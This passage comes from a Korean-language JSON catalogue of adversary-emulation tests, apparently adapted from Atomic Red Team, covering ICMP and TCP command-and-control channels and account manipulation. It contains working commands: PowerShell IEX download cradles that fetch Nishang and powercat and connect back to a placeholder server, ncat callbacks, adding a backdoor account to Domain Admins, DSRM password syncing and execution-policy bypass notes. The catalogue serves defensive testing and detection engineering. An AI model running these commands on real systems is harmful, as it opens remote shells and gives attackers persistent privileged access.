      "summary": "Nishang의 Invoke-PowerShellIcmp 스크립트를 다운로드해 메모리에서 로드한 뒤, ICMP 에코 패킷을 이용한 C2 채널을 수립하는 시나리오를 시뮬레이션한다. 지정한 server_ip로 향하는 ICMP 요청에 명령·응답 데이터가 포함되며, 네트워크 레벨에서 비정상적인 ICMP 트래픽 패턴을 관찰할 수 있다.",
      "procedure": [
        "공격자 측 리스너(블로그 예제의 ICMP C2 서버)를 server_ip에 맞춰 미리 구동해둔다.",
        "피해자 시스템에서 PowerShell을 실행하고, WebClient 객체를 이용해 Nishang GitHub 저장소의 Invoke-PowerShellIcmp.ps1를 다운로드한다.",
        "IEX (New-Object System.Net.WebClient).Downloadstring('<Nishang-URL>') 명령으로 스크립트를 디스크에 저장하지 않고 메모리에 직접 로드한다.",
        "Invoke-PowerShellIcmp -IPAddress #{server_ip} 명령을 호출해 지정된 서버 IP로 향하는 ICMP 기반 C2 세션을 수립한다.",
        "공격자는 리스너 측에서 ICMP 패킷에 인코딩된 명령·응답을 주고받으며, 피해 호스트에서 명령 실행 및 결과 수신을 수행할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')\nInvoke-PowerShellIcmp -IPAddress #{server_ip}"
        }
      ],
      "prerequisites": [
        "server_ip에 해당하는 공격자 측 ICMP C2 리스너가 사전에 구성되어 있어야 한다.",
        "피해자 시스템에서 GitHub 도메인에 대한 아웃바운드 HTTP/HTTPS 접속이 허용되어야 하며, WebClient를 통한 스크립트 다운로드가 차단되지 않아야 한다.",
        "네트워크 방화벽이나 IDS/IPS가 ICMP 트래픽을 전면 차단하지 않는 환경이어야 한다(에코 요청/응답이 허용되어야 C2 채널이 유지됨).",
        "PowerShell 실행 정책이 원격 스크립트 로드를 제한할 수 있으므로, 필요 시 Bypass 등 적절한 실행 정책으로 세션을 시작해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "WebClient로 원격 스크립트를 다운로드하고 Invoke-PowerShellIcmp를 통해 ICMP C2 세션을 수립하는 PowerShell 프로세스",
            "commandline_pattern": "*Downloadstring('https://raw.githubusercontent.com/samratashok/nishang*Invoke-PowerShellIcmp*"
          }
        ],
        "network": [
          {
            "destination": "#{server_ip}",
            "description": "피해 호스트에서 server_ip로 전송되는 비정상적으로 빈번하거나 크기가 큰 ICMP Echo Request/Reply 패턴(명령 및 결과 데이터 포함 가능)"
          }
        ]
      },
      "cleanup": [
        "PowerShell 세션을 종료하거나, 해당 세션에서 Invoke-PowerShellIcmp 실행을 중단해 ICMP C2 채널을 끊는다.",
        "관련 PowerShell 히스토리(콘솔 기록 등)를 보존하거나 필요 시 삭제해 후속 분석·포렌식 전략에 맞게 정리한다.",
        "네트워크 측에서는 ICMP 트래픽 캡처를 중단하고, 실험 목적이었다면 해당 기간의 패킷 캡처를 보관해 탐지 룰 튜닝에 활용한다."
      ],
      "metadata": {
        "atomic_source_id": "0268e63c-e244-42db-bef7-72a9e59fc1fc"
      }
    },
    {
      "test_id": "T1095-2",
      "name": "Netcat (ncat.exe) C2 over arbitrary TCP port",
      "platforms": ["windows"],
      "summary": "ncat.exe를 이용해 지정된 server_ip:server_port로 TCP 연결을 수립하고, Netcat 기반 C2 세션을 시뮬레이션한다. Windows 측에서는 클라이언트 역할을 수행하고, 원격 Linux/Unix 시스템에서 nc -l -p <port> 리스너를 통해 명령·응답 스트림을 주고받는다.",
      "procedure": [
        "공격자(리스너) 측 Linux 등에서 nc -l -p <port> 명령을 사용해 server_port에 대한 리스너를 실행한다.",
        "피해자 시스템에 ncat.exe가 있는지 ncat_exe 경로(기본: PathToAtomicsFolder\\..\\ExternalPayloads\\T1095\\nmap-7.80\\ncat.exe)를 기준으로 확인한다.",
        "없을 경우 get_prereq 단계에서 nmap-7.80-win32.zip을 다운로드 후, Expand-Archive로 압축을 풀어 nmap-7.80\\ncat.exe를 준비한다. 필요시 vcredist_x86.exe를 실행해 VC++ 런타임을 설치한다.",
        "PowerShell에서 cmd /c \"#{ncat_exe} #{server_ip} #{server_port}\" 명령을 호출해 ncat 클라이언트를 실행한다.",
        "연결이 수립되면 원격 리스너 측 콘솔에서 피해 호스트와의 표준 입력/출력 스트림을 통해 명령 실행·데이터 전송을 수행할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "cmd /c \"#{ncat_exe} #{server_ip} #{server_port}\""
        }
      ],
      "prerequisites": [
        "server_ip:server_port에서 nc -l -p <port> 또는 이에 상응하는 Netcat 리스너가 구동 중이어야 한다.",
        "테스트 전에 ncat_exe 경로에 ncat.exe가 존재하거나, get_prereq 단계에서 Nmap 윈도우 패키지를 다운로드 및 압축 해제할 수 있어야 한다.",
        "Windows 시스템에서 지정된 server_ip:server_port로의 아웃바운드 TCP 연결이 방화벽 등 보안 장비에 의해 차단되지 않아야 한다.",
        "VC++ 런타임(vcredist_x86.exe)이 설치되지 않은 환경이라면, ncat.exe 실행 시 런타임 설치가 필요할 수 있다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1095\\nmap.zip",
            "description": "Nmap 및 ncat.exe를 포함하는 다운로드된 ZIP 아카이브(실제 경로는 get_prereq에서 parentpath\\nmap.zip 형태)"
          },
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1095\\nmap-7.80\\ncat.exe",
            "description": "압축 해제 후 생성된 Ncat 실행 파일(Windows용 Netcat 변형)"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Invoke-WebRequest로 Nmap 패키지를 다운로드하고 cmd를 통해 ncat.exe를 실행하는 PowerShell 프로세스",
            "commandline_pattern": "*cmd /c*#{ncat_exe} #{server_ip} #{server_port}*"
          },
          {
            "name": "cmd.exe",
            "description": "PowerShell에서 호출되어 실제 ncat.exe를 실행하는 중간 셸 프로세스",
            "commandline_pattern": "*/c *ncat.exe*"
          },
          {
            "name": "ncat.exe",
            "description": "server_ip:server_port로 TCP C2 연결을 수립하는 Netcat 클라이언트 프로세스",
            "commandline_pattern": "*\\nmap-7.80\\ncat.exe*"
          }
        ],
        "network": [
          {
            "destination": "#{server_ip}:#{server_port}",
            "description": "피해 호스트에서 공격자 리스너로 향하는 지속적인 TCP 세션(명령·응답 데이터가 평문 또는 단순 인코딩 형태로 흐를 수 있음)"
          }
        ]
      },
      "cleanup": [
        "ncat.exe 프로세스를 종료해 C2 세션을 끊는다(작업 관리자, taskkill /IM ncat.exe /F 등).",
        "테스트 후에는 PathToAtomicsFolder\\..\\ExternalPayloads\\T1095\\nmap-7.80 디렉터리 및 nmap.zip 파일을 삭제해 도구 흔적을 최소화할 수 있다.",
        "보안 솔루션/로그 시스템에서 테스트 타임스탬프와 동일한 Netcat 트래픽을 정상 테스트로 태깅해 향후 분석 시 혼동을 줄인다."
      ],
      "metadata": {
        "atomic_source_id": "bcf0d1c1-3f6a-4847-b1c9-7ed4ea321f37"
      }
    },
    {
      "test_id": "T1095-3",
      "name": "Powercat TCP C2 over non-application port",
      "platforms": ["windows"],
      "summary": "Powercat 스크립트를 원격 GitHub에서 다운로드해 메모리에 로드한 뒤, powercat -c 서버 -p 포트 명령으로 TCP 기반 C2 채널을 수립하는 시나리오를 시뮬레이션한다. Netcat과 유사한 기능을 PowerShell로 구현한 형태이며, 지정한 server_ip:server_port로의 비표준 포트 연결을 통해 명령·응답을 교환한다.",
      "procedure": [
        "공격자 측 Linux 등에서 nc -l -p <port> 또는 호환 가능한 Netcat/Powercat 리스너를 server_port에 맞춰 구동한다.",
        "피해자 시스템에서 PowerShell을 실행하고, WebClient를 사용해 powercat.ps1 스크립트를 GitHub에서 다운로드한다.",
        "IEX (New-Object System.Net.Webclient).Downloadstring('<powercat-URL>') 명령으로 powercat.ps1 내용을 디스크에 저장하지 않고 세션 메모리에 직접 로드한다.",
        "powercat -c #{server_ip} -p #{server_port} 명령을 실행해 server_ip:server_port로 TCP 클라이언트 연결을 생성한다.",
        "연결이 수립되면 공격자 리스너 측에서 Powercat 세션을 통해 명령 실행, 파일 전송 등 다양한 C2 활동을 수행할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')\npowercat -c #{server_ip} -p #{server_port}"
        }
      ],
      "prerequisites": [
        "server_ip:server_port 측에 Netcat/Powercat 기반 리스너가 구동 중이어야 한다(nc -l -p <port> 등).",
        "피해자 시스템에서 GitHub 도메인에 대한 아웃바운드 HTTP/HTTPS 접속이 허용되어 있어야 한다.",
        "PowerShell 실행 정책이 메모리 내 스크립트 로드를 허용해야 하며, 제한적인 정책일 경우 Bypass 모드 등의 우회 설정이 필요할 수 있다.",
        "방화벽 또는 EDR 제품이 해당 포트(server_port)에 대한 아웃바운드 TCP 연결이나 Powercat 행위를 전면 차단하지 않는 환경이어야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "powercat.ps1 스크립트를 메모리에 로드하고 TCP C2 연결을 생성하는 PowerShell 프로세스",
            "commandline_pattern": "*Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat*powercat -c #{server_ip} -p #{server_port}*"
          }
        ],
        "network": [
          {
            "destination": "#{server_ip}:#{server_port}",
            "description": "Powercat이 생성하는 비표준 포트 또는 일반 포트(예: 80, 443 등)로의 지속적인 TCP 세션(명령·응답 및 파일 전송 등 C2 트래픽 포함)"
          }
        ]
      },
      "cleanup": [
        "PowerShell 세션을 종료하거나 powercat 세션을 중단해 C2 연결을 끊는다.",
        "실험 목적이었다면, 해당 기간의 네트워크 로그/PCAP을 보관해 Powercat 기반 C2 트래픽의 특징 분석과 탐지 룰 설계에 활용한다.",
        "PowerShell 히스토리 및 관련 이벤트 로그(4104 등 스크립트 로깅)가 환경에서 불필요한 노이즈를 발생시키지 않도록 정책에 맞게 정리 또는 마킹한다."
      ],
      "metadata": {
        "atomic_source_id": "3e0e0e7f-6aa2-4a61-b61d-526c2cc9330e"
      }
    }
  ]
},
{
  "technique_id": "T1098",
  "technique_name": "Account Manipulation",
  "tactic": "Persistence",
  "description": "계정 조작(Account Manipulation)은 공격자가 기존 계정/그룹/계정 속성(이름, 설명, 비밀번호, 권한 등)을 변경하거나 새로운 계정을 은밀히 추가해 장기적인 접근 권한과 권한 상승 발판을 확보하는 기법이다. 로컬·도메인 관리자 계정을 눈에 띄지 않는 이름으로 바꾸거나, 백도어 계정을 고권한 그룹에 추가하고, DSRM 같은 특수 계정의 비밀번호를 변경해 재부팅 이후에도 재침투가 가능하도록 만드는 행위가 대표적인 예다. 또한 패스워드 정책의 빈틈을 시험하거나 쉽게 추측 가능한 비밀번호 조합을 강제로 사용하게 하는 것도 이 기법의 범주에 포함된다.",
  "tests": [
    {
      "test_id": "T1098-1",
      "name": "Admin Account Manipulate",
      "platforms": ["windows"],
      "summary": "로컬 Administrators 그룹에 속한 계정 중 이름에 'Administrator'가 포함된 로컬 사용자 계정을 찾아 HaHa_랜덤숫자 형식의 이름으로 변경하는 시나리오다. 원래 계정 이름과 설명은 Description 필드에 atr:원래이름;기존설명 형태로 숨겨 두었다가, cleanup 단계에서 이를 파싱해 다시 원래 상태로 복구한다. 실제 공격에서는 기본 관리자 계정의 존재를 숨기거나, 보안 담당자의 계정 식별·차단을 어렵게 하는 데 활용될 수 있다.",
      "procedure": [
        "랜덤 숫자 4개(x, y, z, w)를 생성해 HaHa_xxyz 형식의 새 계정 이름 토큰을 만든다.",
        "Get-LocalGroupMember -Group Administrators 로 로컬 Administrators 그룹 구성원을 나열한다.",
        "ObjectClass=User, PrincipalSource=Local 이고 이름에 'Administrator'가 포함된 계정을 찾는다.",
        "해당 계정의 Description 필드에 'atr:원래이름;기존설명'을 저장한 뒤 Rename-LocalUser로 계정명을 변경한다.",
        "cleanup 시 Description에 atr: 패턴이 있는 계정을 찾아 원래 이름과 설명으로 되돌린다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$x = Get-Random -Minimum 2 -Maximum 9999; $fmm = Get-LocalGroupMember -Group Administrators | ?{ $_.ObjectClass -match 'User' -and $_.PrincipalSource -match 'Local' }; foreach($member in $fmm) { if($member.Name -like '*Administrator*') { $account = $member.Name.Split('\\')[-1]; $origDesc = (Get-LocalUser -Name $account).Description; Set-LocalUser -Name $account -Description ('atr:' + $account + ';' + $origDesc).Substring(0,48); Rename-LocalUser -Name $account -NewName ('HaHa_' + $x); } }"
        }
      ],
      "prerequisites": [
        "로컬 시스템에 PowerShell 5.x 이상과 LocalAccounts 모듈(Get-LocalUser, Rename-LocalUser)이 사용 가능해야 한다.",
        "현재 세션이 로컬 Administrators 그룹 구성원이어야 하며, 로컬 계정 이름 및 설명 변경 권한이 필요하다.",
        "로컬 Administrators 그룹에 'Administrator' 문자열이 포함된 로컬 사용자 계정이 존재해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "로컬 Administrators 그룹 조회 및 Administrator 계정 이름·설명 변경에 사용된 PowerShell 세션",
            "commandline_pattern": "Get-LocalGroupMember -Group Administrators; Rename-LocalUser -NewName HaHa_*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "Description 필드에 'atr:' 접두어가 포함된 로컬 사용자 계정을 열거한다.",
        "각 계정의 Description에서 원래 이름과 기존 설명(atr:이름;설명)을 파싱해 Set-LocalUser로 되돌린다.",
        "Rename-LocalUser를 사용해 HaHa_* 계정을 원래 계정 이름으로 복구한다."
      ],
      "metadata": {
        "atomic_source_id": "5598f7cb-cf43-455e-883a-f6008c5d46af"
      }
    },
    {
      "test_id": "T1098-2",
      "name": "Domain Account and Group Manipulate",
      "platforms": ["windows"],
      "summary": "Active Directory 환경에서 atr-xxxx 형식의 무작위 계정을 생성한 뒤, 기본값으로 Domain Admins 같은 고권한 도메인 그룹에 추가하는 시나리오다. 공격자는 정상 서비스 계정처럼 보이는 이름을 사용해 백도어 계정을 만들어 두고, 고권한 그룹에 은밀히 넣어 장기적인 도메인 관리자 권한을 확보할 수 있다. cleanup 단계에서는 samAccountName이 atr- 접두어이고 GivenName이 Test인 계정을 LDAP 필터로 찾아 Remove-ADUser로 일괄 삭제한다.",
      "procedure": [
        "ActiveDirectory PowerShell 모듈을 Import-Module ActiveDirectory로 로드한다.",
        "랜덤 숫자 4개를 묶어 atr-xxxx 형식의 새 도메인 계정 이름을 생성한다.",
        "New-ADUser로 Enabled:$False 상태의 테스트용 도메인 사용자 계정을 생성한다.",
        "Add-ADGroupMember 'Domain Admins' <계정>으로 지정한 도메인 그룹(Domain Admins 등)에 계정을 추가한다.",
        "cleanup 시 LDAPFilter로 atr- 접두어 + GivenName=Test 계정을 검색해 Remove-ADUser로 제거한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Import-Module ActiveDirectory; $account = 'atr-' + (Get-Random -Minimum 10 -Maximum 99) + (Get-Random -Minimum 10 -Maximum 99); New-ADUser -Name $account -GivenName 'Test' -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False; Add-ADGroupMember 'Domain Admins' $account"
        }
      ],
      "prerequisites": [
        "테스트를 실행하는 계정에 New-ADUser 및 Add-ADGroupMember 권한(예: Account Operators, Domain Admins 등)이 있어야 한다.",
        "RSAT ActiveDirectory 모듈이 설치되어 있고 Import-Module ActiveDirectory가 정상 동작해야 한다.",
        "타겟 도메인 내에 'Domain Admins' 또는 입력으로 지정한 그룹이 존재해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "New-ADUser 및 Add-ADGroupMember를 통해 도메인 계정 생성 및 고권한 그룹 추가에 사용된 PowerShell 세션",
            "commandline_pattern": "Import-Module ActiveDirectory; New-ADUser *; Add-ADGroupMember *"
          }
        ],
        "network": []
      },
      "cleanup": [
        "Get-ADUser -LDAPFilter \"(&(samaccountname=atr-*)(givenName=Test))\" 로 테스트용 도메인 계정을 검색한다.",
        "검색된 계정을 Remove-ADUser -Confirm:$False 로 일괄 삭제한다.",
        "테스트용 계정 삭제 이벤트(4726)와 그룹 구성원 변조 이벤트(4728/4729)를 추가적으로 검토해 잔여 영향이 없는지 확인한다."
      ],
      "metadata": {
        "atomic_source_id": "a55a22e9-a3d3-42ce-bd48-2653adb8f7a9"
      }
    },
    {
      "test_id": "T1098-3",
      "name": "Password Change on Directory Service Restore Mode (DSRM) Account",
      "platforms": ["windows"],
      "summary": "이 테스트는 도메인 컨트롤러에서 ntdsutil을 사용해 Directory Service Restore Mode(DSRM) 계정의 비밀번호를 기존 도메인 계정의 비밀번호와 동기화한다. DSRM 계정은 AD 오프라인 복구 모드에서 로컬 로그온에 사용되는 강력한 계정이므로, 공격자가 이 비밀번호를 통제하면 AD DB 조작 및 추가 권한 상승이 가능해진다. 자동 복구가 없으므로 테스트 후 반드시 안전한 값으로 재설정해야 한다.",
      "procedure": [
        "도메인 컨트롤러에서 관리자 권한 cmd.exe를 실행한다.",
        "ntdsutil을 호출해 'set dsrm password' 하위 메뉴로 진입한다.",
        "'sync from domain account <계정>' 명령으로 지정 도메인 계정 비밀번호를 DSRM 계정에 동기화한다.",
        "q 명령을 두 번 입력해 ntdsutil을 종료한다.",
        "필요 시 DSRM 계정 비밀번호를 별도의 강력한 값으로 다시 변경한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "ntdsutil \"set dsrm password\" \"sync from domain account %username%\" \"q\" \"q\""
        }
      ],
      "prerequisites": [
        "테스트는 반드시 도메인 컨트롤러(DC)에서 로컬 관리자/도메인 관리자 권한으로 수행해야 한다.",
        "도메인 계정(sync_account)이 도메인에 존재하고, 해당 계정 비밀번호를 알고 있어야 한다.",
        "DSRM 비밀번호 변경이 조직 정책상 허용되는지 및 이후 복구 절차에 대한 사전 합의가 필요하다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "ntdsutil.exe",
            "description": "DSRM 계정 비밀번호를 도메인 계정으로부터 동기화하는 데 사용된 디렉터리 서비스 유틸리티",
            "commandline_pattern": "ntdsutil \"set dsrm password\" \"sync from domain account *\""
          },
          {
            "name": "cmd.exe",
            "description": "관리자 권한으로 ntdsutil을 실행한 콘솔 세션",
            "commandline_pattern": "cmd.exe /c ntdsutil *"
          }
        ],
        "network": []
      },
      "cleanup": [
        "조직 정책에 따라 DSRM 계정 비밀번호를 별도의 강력한 랜덤 값으로 다시 설정한다.",
        "디렉터리 서비스 로그(예: 4794 – DSRM 비밀번호 변경) 및 관리자 활동 로그를 검토해 비인가 변경이 없는지 확인한다.",
        "테스트용으로 사용한 도메인 계정의 권한과 비밀번호도 필요 시 초기 상태로 복원한다."
      ],
      "metadata": {
        "atomic_source_id": "d5b886d9-d1c7-4b6e-a7b0-460041bf2823"
      }
    },
    {
      "test_id": "T1098-4",
      "name": "Domain Password Policy Check: Short Password",
      "platforms": ["windows"],
      "summary": "이 테스트는 현재 도메인 사용자 계정의 비밀번호를 길이 7자의 Uplow-1 값으로 변경해 보며, 최소 길이 및 복잡도 정책이 실제로 적용되는지 확인한다. 기존 비밀번호는 cred_file에 SecureString 형태로 저장해 두고, Set-ADAccountPassword 호출 시 OldPassword로 사용한다. 짧은 비밀번호로 변경이 성공하면 패스워드 정책이 허술하거나 적용이 잘못되어 브루트포스·사전 공격에 취약하다는 신호가 된다.",
      "procedure": [
        "사전 준비 단계에서 Get-Credential을 사용해 현재 사용자 비밀번호를 cred_file에 암호화 저장한다.",
        "cred_file에서 SecureString 비밀번호를 읽어 PSCredential 객체를 생성한다.",
        "ConvertTo-SecureString 'Uplow-1' -AsPlainText -Force 로 새 비밀번호 SecureString을 만든다.",
        "Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.Password -NewPassword $newPassword 를 호출한다.",
        "성공 시 cred_file 내용을 새 비밀번호로 갱신하고, 실패 시 예외 코드와 메시지를 로깅한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) { $cred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)); $newPassword = ConvertTo-SecureString 'Uplow-1' -AsPlainText -Force; Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.Password -NewPassword $newPassword }"
        }
      ],
      "prerequisites": [
        "사전 단계에서 현재 사용자 비밀번호를 cred_file에 저장해 두어야 한다.",
        "테스트 계정은 도메인 계정이어야 하며, 자신의 비밀번호를 변경할 수 있는 권한이 있어야 한다.",
        "ActiveDirectory 모듈이 설치돼 있고 Set-ADAccountPassword 사용이 가능해야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt",
            "description": "현재 사용자 비밀번호를 SecureString 형태로 저장한 cred_file"
          }
        ],
        "files_read": [
          {
            "path": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt",
            "description": "비밀번호 변경 시 OldPassword를 가져오기 위해 읽는 cred_file"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "cred_file을 읽어 Set-ADAccountPassword로 짧은 비밀번호 변경을 시도한 PowerShell 세션",
            "commandline_pattern": "Set-ADAccountPassword -Identity * -OldPassword * -NewPassword (ConvertTo-SecureString Uplow-1 -AsPlainText -Force)"
          }
        ],
        "network": []
      },
      "cleanup": [
        "cred_file 내에 저장된 비밀번호가 실제 계정 비밀번호와 일치하도록 갱신하거나, 테스트 완료 후 cred_file을 삭제한다.",
        "짧은 비밀번호가 실제로 설정되었다면 즉시 강력하고 정책에 맞는 비밀번호로 다시 변경한다.",
        "보안 로그의 비밀번호 변경 이벤트(4723/4724)를 검토해 비정상적인 시도가 반복되지 않았는지 확인한다."
      ],
      "metadata": {
        "atomic_source_id": "fc5f9414-bd67-4f5f-a08e-e5381e29cbd1"
      }
    },
    {
      "test_id": "T1098-5",
      "name": "Domain Password Policy Check: No Number in Password",
      "platforms": ["windows"],
      "summary": "이 테스트는 숫자가 전혀 포함되지 않은 긴 비밀번호(UpperLowerLong-special)를 새 비밀번호로 설정해, 도메인 정책이 숫자 포함을 필수로 요구하는지 검증한다. 만약 이런 비밀번호로 변경이 성공하면 사용자가 문자·특수문자만 포함된 취약한 패턴을 쉽게 사용할 수 있고, 이는 사전 공격에 취약하다. 스크립트는 cred_file에 저장된 기존 비밀번호와 새 비밀번호가 동일한지 먼저 확인한 뒤, Set-ADAccountPassword를 호출한다.",
      "procedure": [
        "cred_file에서 현재 사용자 비밀번호를 읽어 PSCredential 객체를 생성한다.",
        "새 비밀번호(UpperLowerLong-special)가 cred_file에 저장된 값과 동일한지 비교해 동일하면 종료한다.",
        "ConvertTo-SecureString 'UpperLowerLong-special' -AsPlainText -Force 로 새 비밀번호 SecureString을 만든다.",
        "Set-ADAccountPassword로 도메인 계정 비밀번호를 변경하고, 예외 발생 시 ErrorCode를 출력한다.",
        "성공 시 cred_file을 새 비밀번호로 갱신한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) { $cred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)); $newPassword = ConvertTo-SecureString 'UpperLowerLong-special' -AsPlainText -Force; Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.Password -NewPassword $newPassword }"
        }
      ],
      "prerequisites": [
        "cred_file에 현재 사용자 비밀번호가 사전에 저장되어 있어야 한다.",
        "경험적으로 도메인 정책이 숫자 포함을 요구하는지 확인하기 위한 테스트 계정 사용이 권장된다.",
        "ActiveDirectory 모듈 및 Set-ADAccountPassword 사용 권한이 필요하다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt",
            "description": "현재 사용자 비밀번호를 저장하는 cred_file (기존/변경된 비밀번호 모두 포함 가능)"
          }
        ],
        "files_read": [
          {
            "path": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt",
            "description": "새 비밀번호 적용 전 비교 및 OldPassword 확보를 위해 읽는 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "숫자가 없는 비밀번호로 도메인 비밀번호 변경을 시도하는 PowerShell 세션",
            "commandline_pattern": "Set-ADAccountPassword -Identity * -NewPassword (ConvertTo-SecureString UpperLowerLong-special -AsPlainText -Force)"
          }
        ],
        "network": []
      },
      "cleanup": [
        "테스트에 사용된 계정의 비밀번호를 정책에 적합한 강도의 복잡한 비밀번호로 다시 변경한다.",
        "cred_file에 남아 있는 테스트 비밀번호 값이 있다면 갱신하거나 파일을 삭제한다.",
        "비밀번호 변경 이벤트와 계정 잠금 이벤트를 모니터링해 의도치 않은 잠금이 발생하지 않았는지 확인한다."
      ],
      "metadata": {
        "atomic_source_id": "68190529-069b-4ffc-a942-919704158065"
      }
    },
    {
      "test_id": "T1098-6",
      "name": "Domain Password Policy Check: No Special Character in Password",
      "platforms": ["windows"],
      "summary": "이 테스트는 특수문자를 전혀 포함하지 않는 비밀번호(UpperLowerLong333noSpecialChar)를 설정해 비밀번호 정책이 특수문자 사용을 강제하는지 확인한다. 정책이 허술해 이런 비밀번호가 허용될 경우 사용자들은 Company2025 같은 단순 패턴을 널리 사용할 수 있고, 이는 무차별 대입에 매우 취약하다. 스크립트는 실패 시 예외 코드와 메시지를 출력해 정책 거부 사유를 파악할 수 있게 한다.",
      "procedure": [
        "cred_file에서 기존 비밀번호를 읽고 PSCredential 객체를 생성한다.",
        "새 비밀번호(UpperLowerLong333noSpecialChar)가 기존 값과 동일한지 검사해 동일하면 테스트를 중단한다.",
        "ConvertTo-SecureString 'UpperLowerLong333noSpecialChar' -AsPlainText -Force 로 새 비밀번호를 준비한다.",
        "Set-ADAccountPassword로 비밀번호 변경을 시도하고, 실패 시 예외 및 ErrorCode를 출력한다.",
        "성공 시 cred_file을 새 비밀번호로 갱신한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) { $cred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)); $newPassword = ConvertTo-SecureString 'UpperLowerLong333noSpecialChar' -AsPlainText -Force; Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.Password -NewPassword $newPassword }"
        }
      ],
      "prerequisites": [
        "cred_file에 현재 사용자 비밀번호가 저장되어 있어야 하며, 값이 최신 상태여야 한다.",
        "테스트 계정은 도메인에 존재하고, 스스로의 비밀번호를 변경할 수 있어야 한다.",
        "ActiveDirectory 모듈 사용이 가능해야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt",
            "description": "비밀번호 변경 전후로 계정 비밀번호를 저장하는 cred_file"
          }
        ],
        "files_read": [
          {
            "path": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt",
            "description": "기존 비밀번호를 OldPassword로 사용하기 위해 읽는 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "특수문자 없는 비밀번호로 도메인 계정 비밀번호를 변경하는 PowerShell 실행 흔적",
            "commandline_pattern": "Set-ADAccountPassword -Identity * -NewPassword (ConvertTo-SecureString UpperLowerLong333noSpecialChar -AsPlainText -Force)"
          }
        ],
        "network": []
      },
      "cleanup": [
        "테스트에서 설정된 비밀번호를 즉시 복잡도가 높은 강력한 비밀번호로 교체한다.",
        "cred_file을 제거하거나, 장기적으로 사용할 필요가 있다면 암호화 및 접근 제어를 강화한다.",
        "정책 점검 결과를 바탕으로 도메인 패스워드 복잡도 설정을 재검토한다."
      ],
      "metadata": {
        "atomic_source_id": "7d984ef2-2db2-4cec-b090-e637e1698f61"
      }
    },
    {
      "test_id": "T1098-7",
      "name": "Domain Password Policy Check: No Uppercase Character in Password",
      "platforms": ["windows"],
      "summary": "이 테스트는 모두 소문자와 숫자·특수문자로만 이루어진 비밀번호(lower-long-special-333)를 사용해 비밀번호 변경을 시도하며, 대문자 사용이 정책상 필수인지 확인한다. 대문자 요구사항이 없다면 공격자는 '소문자+숫자+특수문자' 패턴만을 대상으로 하는 사전으로도 많은 계정을 노릴 수 있다. 스크립트는 cred_file에 저장된 비밀번호와 새 비밀번호가 동일한지 확인하고, Set-ADAccountPassword를 호출한다.",
      "procedure": [
        "cred_file에서 현재 비밀번호를 읽어 PSCredential 객체를 만든다.",
        "새 비밀번호(lower-long-special-333)가 cred_file 값과 동일한지 검사한다.",
